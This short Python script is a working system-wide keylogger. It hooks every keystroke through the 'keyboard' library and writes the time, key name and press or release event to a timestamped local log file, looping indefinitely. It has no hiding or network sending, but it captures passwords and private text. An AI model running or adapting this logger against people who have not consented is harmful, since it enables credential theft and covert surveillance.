import logging
from datetime import datetime

import keyboard


logging.basicConfig(filename=f"key_logs/{datetime.now().strftime('%Y_%m_%d %H_%M_%S,%f')} key.log", filemode='w', format='%(message)s', encoding="utf-8" , level=logging.DEBUG)

def key_event_stringify(keyboard_event: keyboard.KeyboardEvent):
    return f"{datetime.fromtimestamp(keyboard_event.time).strftime('%Y/%m/%d %H:%M:%S,%f')};{keyboard_event.name};{keyboard_event.event_type}"

keyboard.hook(lambda keyboard_event: logging.info(key_event_stringify(keyboard_event)))

while True:
    ...
